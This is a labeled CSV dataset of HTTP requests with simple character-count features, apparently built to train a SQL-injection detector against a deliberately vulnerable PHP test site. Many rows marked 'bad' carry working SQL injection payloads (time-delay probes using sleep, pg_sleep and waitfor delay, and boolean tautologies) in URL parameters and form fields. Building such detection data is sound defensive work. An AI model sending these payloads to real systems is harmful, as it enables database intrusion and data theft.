method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/showimage.php?file=08yFeTpr';%20waitfor%20delay%20'0:0:3'%20--%20&size=160,,3,0,1,0,5,2,bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
POST,/search.php?test=query,-1%20OR%202%2B587-587-1=0%2B0%2B0%2B1&searchFor=the,0,0,0,0,2,0,bad
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sD23QGol';%20waitfor%20delay%20'0:0:9'%20--%20&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,3,0,1,0,7,2,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php?id=1%20AND%203*2*1=6%20AND%20286=286,,0,0,0,0,4,0,bad
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=1%20AND%203*2*0=6%20AND%20106=106,0,0,0,0,4,0,bad
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
POST,/cart.php,"addcart=5&price=(select(0)from(select(sleep(9)))v)/*'%2B(select(0)from(select(sleep(9)))v)%2B'""%2B(select(0)from(select(sleep(9)))v)%2B""*/",2,2,0,15,0,9,bad
POST,/cart.php,addcart=6&price=if(now()=sysdate()%2Csleep(9)%2C0),0,0,0,4,0,1,bad
GET,/hpp/,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/plugin.min,,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=6,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=7,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=4,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,-1%20OR%202%2B265-265-1=0%2B0%2B0%2B1%20--%20&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,0,0,1,0,6,0,bad
GET,/artists.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/Mod_Rewrite_Shop/images,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=-1%20OR%203*2>(0%2B5%2B963-963)%20--%20&price=1000,0,0,1,1,4,0,bad
POST,/AJAX/infotitle.php,id=3,0,0,0,0,0,0,good
POST,/cart.php,addcart=-1;select%20pg_sleep(3);%20--%20&price=800,0,0,1,1,3,2,bad
POST,/AJAX/infotitle.php,id=2,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
POST,/userinfo.php,"pass=g00dPa%24%24w0rD&uname=1ACUSTART'""21SD1ACUEND",1,1,0,0,0,0,bad
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/.idea/modules.xml,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
POST,/AJAX/showxml.php,1ACUSTART ACUEND,0,0,0,0,1,0,bad
POST,/comment.php,0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z&comment=1&name=<your%20name%20here>&phpaction=echo%20%24_POST[comment];,2,0,0,5,3,1,bad
GET,/cart.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,YPV4V6HZ';select%20pg_sleep(3);%20--%20&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,1,0,1,1,5,2,bad
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/secured/index.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=j6V6NfyI&urname=zFPWdwPk&uuname=zFPWdwPk,0,0,0,0,2,0,bad
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=-1;select%20pg_sleep(3);%20--%20&price=15000,0,0,1,1,3,2,bad
GET,/search.php,,0,0,0,0,0,0,good
POST,/cart.php,"addcart=6&price=1ACUSTART'""xp3b0ACUEND",1,1,0,0,0,0,bad
GET,/redir.php,,0,0,0,0,0,0,good
GET,/signup.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=-1%20OR%202%2B35-35-1=0%2B0%2B0%2B1&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,0,0,0,0,4,0,bad
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=-1%20OR%203%2B550-550-1=0%2B0%2B0%2B1%20--%20&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,0,0,1,0,6,0,bad
GET,/listproducts.php?cat=1,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/vendor/symfony.com,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=5&price=-1);select%20pg_sleep(3);%20--%20,0,0,1,1,3,2,bad
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
POST,/comment.php,Submit=Submit&comment=-1%20OR%202%2B294-294-1=0%2B0%2B0%2B1&name=<your%20name%20here>&phpaction=echo%20%24_POST[comment];,0,0,0,0,5,0,bad
GET,/%11[%FA%9F%A3%F7%DF%F6R%E1%FF%00%1E%DFn%B1}%CF%FF%D9%BF%00,,0,0,0,0,0,0,good
GET,/Templates/main_dynamic_template.dwt.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/vendor/ymfony/yaml.git,,0,0,0,0,0,0,good
GET,/artists.php?artist=if(now()=sysdate()%2Csleep(9)%2C0),,0,0,0,4,0,1,bad
GET,/artists.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,"/showimage.php?file=1ACUSTART'""d329LACUEND&size=160",,1,1,0,0,0,0,bad
GET,/listproducts.php?cat=-1%20OR%203*2<(0%2B5%2B109-109)%20--%20,,0,0,1,1,4,0,bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/wvstests/pmwiki_2_1_19/scripts,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=-1'%20OR%203*2>(0%2B5%2B602-602)%20--%20,1,0,1,1,6,0,bad
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
POST,/guestbook.php,submit=add%20message&name=2r4LOTEf';select%20pg_sleep(9);%20--%20&text=1,1,0,1,1,4,2,bad
GET,/comment.php?aid=3,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/product.php?pic=-1%20OR%203*2<(0%2B5%2B831-831),,0,0,0,1,2,0,bad
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=7&price=BX7JAKK5,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php?id=1*1*1*1*1*1,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php?id=1,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=-1'%20OR%203%2B63-63-1=0%2B0%2B0%2B1%20--%20,1,0,1,0,6,0,bad
GET,/search.php,,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=11*1*1*0*1*1*173,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,"/hpp/index.php?pp=0""XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR""Z",,0,2,0,5,0,1,bad
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=2zyYb70F';%20waitfor%20delay%20'0:0:6'%20--%20&price=800,3,0,1,0,5,2,bad
GET,/cart.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/database_connect.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/showimage.php?file=4WyzJdgN';select%20pg_sleep(6);%20--%20&size=160,,1,0,1,1,3,2,bad
GET,/comment.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/f%E4%BC%00%8C%E1%966%18xZy%80%18%04%8Be,,0,0,0,0,0,0,good
POST,/search.php?test=ZQk6WSBE,goButton=go&searchFor=the,0,0,0,0,0,0,good
POST,/cart.php,addcart=4&price=-1%20OR%203%2B729-729-1=0%2B0%2B0%2B1%20--%20,0,0,1,0,4,0,bad
POST,/cart.php,"addcart=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'""%2B(select(0)from(select(sleep(6)))v)%2B""*/&price=460",2,2,0,15,0,9,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/showimage.php?file=j0BEwsev,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php?id=1%20AND%205*4=21%20AND%20147=147,,0,0,0,0,4,0,bad
GET,/listproducts.php?cat=-1%20OR%203*2*0=6%20AND%20109=109%20--%20,,0,0,1,0,6,0,bad
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/api.github.com/repos/sebastianbergmann/object-enumerator/zipball/d4ca2fb70344987502567bc50081c03e6192fb26,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=-1'%20OR%203*2*0=6%20AND%2063=63%20--%20,1,0,1,0,8,0,bad
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
POST,/comment.php,Submit=Submit&comment=-1));select%20pg_sleep(9);%20--%20&name=<your%20name%20here>&phpaction=echo%20%24_POST[comment];,0,0,1,1,6,2,bad
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=13*5*2*999&price=986,0,0,0,0,0,0,good
GET,/vendor/ebastianbergmann/version.git,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=3&price=-1;select%20pg_sleep(3);%20--%20,0,0,1,1,3,2,bad
GET,/AJAX/infocateg.php?id=2,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=1ACUSTART%5C&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,0,0,0,0,2,0,bad
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
POST,/AJAX/showxml.php,"<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>%' AND 2*3*8=6*8 AND 'DBb1'!='DBb1%",4,4,0,0,6,0,bad
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/redir.php?r=http://www.eclectasy.com/Fractal-Explorer/index.html%00%00%00%00%00%00%00%40%00%40%00%89%06'%20AND%202*3*8=6*9%20AND%20'rzz9'='rzz9,,4,0,0,0,4,0,bad
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/www.github.com/sebastianbergmann/global-state,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/hpp/params.php?1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,bad
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=4&price=-1'%20OR%203%2B739-739-1=0%2B0%2B0%2B1%20--%20,1,0,1,0,4,0,bad
GET,/hpp/,,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=3,0,0,0,0,0,0,good
GET,/vendor/mikevanriel.com,,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=1,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=2,0,0,0,0,0,0,good
POST,/search.php?test=query,goButton=go&searchFor=0'XOR(if(now()=sysdate()%2Csleep(12)%2C0))XOR'Z,2,0,0,5,0,1,bad
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php?id=3,,0,0,0,0,0,0,good
GET,/github.com/symfony/polyfill-ctype.git,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
POST,/userinfo.php,pass=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&uname=zFPWdwPk,2,0,0,5,0,1,bad
GET,/yaml,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=6,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=7,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=4,0,0,0,0,0,0,good
POST,/AJAX/infotitle.php,id=5,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=3*1*1&price=986,0,0,0,0,0,0,good
POST,/cart.php,addcart=5&price=FgGEQZpG,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/artists.php?artist=1*658*653*0,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
POST,/comment.php,Submit=Submit&comment=rZHkGeRh';select%20pg_sleep(3);%20--%20&name=<your%20name%20here>&phpaction=echo%20%24_POST[comment];,1,0,1,1,6,2,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=-1%20OR%202%2B545-545-1=0%2B0%2B0%2B1&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,0,0,0,0,4,0,bad
GET,/hpp/,,0,0,0,0,0,0,good
POST,/guestbook.php,submit=add%20message&name=lXhjPEvp';%20waitfor%20delay%20'0:0:4'%20--%20&text=1,3,0,1,0,6,2,bad
GET,/comment.php?pid=if(now()=sysdate()%2Csleep(5)%2C0),,0,0,0,4,0,1,bad
GET,/search.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
POST,/comment.php,Submit=Submit&comment=1&name=-1'%20OR%202%2B323-323-1=0%2B0%2B0%2B1%20--%20&phpaction=echo%20%24_POST[comment];,1,0,1,0,5,0,bad
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
POST,/guestbook.php,submit=add%20message&name=anonymous%20user&text=ZXUvV1fa';%20waitfor%20delay%20'0:0:6'%20--%20,3,0,1,0,7,2,bad
POST,/cart.php,addcart=1&price=b9F9FggW'));select%20pg_sleep(6);%20--%20,1,0,1,1,3,2,bad
POST,/comment.php,Submit=Submit&comment=1&name=<your%20name%20here>&phpaction=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z,2,0,0,5,2,1,bad
GET,/cart.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=-1);select%20pg_sleep(3);%20--%20&price=500,0,0,1,1,3,2,bad
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/s%00U%0E%DF%CC9%80w%C11%D6%FA,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/%11%E4%B8%9D%CC?6a%05%F0%04%D2%00%175%B3%EEu,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php,,0,0,0,0,0,0,good
GET,/search.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/comment.php,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/artists.php,,0,0,0,0,0,0,good
GET,/cart.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/AJAX/infoartist.php,,0,0,0,0,0,0,good
GET,/AJAX/infotitle.php,,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
GET,/redir.php?r=http://www.eclectasy.com/Fractal-Explorer/index.html%00%00%00%00%00%00%00%40%00%40%00%89%06,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
POST,/cart.php,"addcart=0""XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR""Z&price=15000",0,2,0,5,0,1,bad
GET,/redir.php,,0,0,0,0,0,0,good
GET,/userinfo.php,,0,0,0,0,0,0,good
POST,/cart.php,addcart=-1%20OR%203*2>(0%2B5%2B425-425)&price=460,0,0,0,1,2,0,bad
POST,/cart.php,"addcart=-1""%20OR%203%2B769-769-1=0%2B0%2B0%2B1%20--%20&price=10000",0,1,1,0,4,0,bad
POST,/cart.php,addcart=2&price=erFXXHxJ';%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,2,bad
GET,/hpp/,,0,0,0,0,0,0,good
GET,/vendor/ebastianbergmann/environment.git,,0,0,0,0,0,0,good
GET,/secured/phpinfo.php?=0'XOR(if(now()=sysdate()%2Csleep(3)%2C0))XOR'Z,,2,0,0,5,0,1,bad
GET,/search.php,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
GET,/medias/css/main.css,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/AJAX/infocateg.php?id=1*745*740*0,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,"/showimage.php?file=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/",,2,2,0,15,0,9,bad
GET,/vendor/ebastianbergmann/exporter.git,,0,0,0,0,0,0,good
GET,/showimage.php,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/secured/newuser.php,,0,0,0,0,0,0,good
GET,/redir.php,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/AJAX/showxml.php,,0,0,0,0,0,0,good
GET,/bxss/vuln.php,,0,0,0,0,0,0,good
GET,/product.php,,0,0,0,0,0,0,good
POST,/secured/newuser.php,"signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=-1""%20OR%202%2B854-854-1=0%2B0%2B0%2B1%20--%20&uuname=zFPWdwPk",0,1,1,0,6,0,bad
